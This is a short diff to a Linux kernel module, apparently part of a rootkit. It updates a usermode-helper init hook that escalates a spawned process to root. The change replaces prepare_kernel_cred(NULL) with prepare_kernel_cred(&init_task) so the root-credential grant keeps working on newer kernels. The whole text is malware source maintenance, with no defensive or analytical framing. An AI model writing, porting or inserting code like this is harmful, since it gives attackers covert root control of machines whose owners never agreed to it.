@@ -3,12 +3,13 @@
 #include <linux/module.h>
 #include <linux/umh.h>
 #include <linux/cred.h>
+#include <linux/sched/task.h>
 #include <linux/slab.h>
 
 // Escalate the spawned process to root
 static int rk_umh_init(struct subprocess_info *info, struct cred *new)
 {
-	commit_creds(prepare_kernel_cred(NULL));
+	commit_creds(prepare_kernel_cred(&init_task));
 	return 0;
 }
 
